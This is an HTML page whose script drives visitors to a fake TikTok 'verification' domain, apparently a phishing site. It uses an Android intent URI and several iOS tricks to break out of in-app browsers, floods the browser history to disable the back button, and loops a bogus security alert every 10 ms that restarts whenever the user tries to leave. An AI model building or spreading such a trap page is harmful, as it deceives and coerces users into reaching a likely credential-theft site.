<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    let testMode = true;

    // Safety switch for your testing
    setTimeout(() => { testMode = false; }, 5000); 

    function forceExternal() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // This 'S.browser_fallback_url' is the key to forcing the OS to pick a new app
            const intent = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
            window.location.href = intent;
        } else {
            // iOS: We shotgun three different ways to trip the "Open in Safari" prompt
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
            window.location.href = target;
            window.open(target, '_blank');
        }
    }

    function rampage() {
        if (!testMode) return;

        // 1. Try to break out first
        forceExternal();

        // 2. The alert blocks the 'X' button and forces a user interaction
        alert("SECURITY: Verification Required.\n\nClick OK to open the secure system browser.");
        
        // 3. Try to break out again immediately after they hit OK
        forceExternal();

        // 4. Loop
        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Build the backstack
        for(let i=0; i<50; i++) history.pushState(null, null, "#step" + i);
        
        // Start the engine
        rampage();
    };

    // If they try to hit the 'X' or the top bar, restart the cycle
    window.onblur = () => { if(testMode) rampage(); };
</script>

</body>
</html>
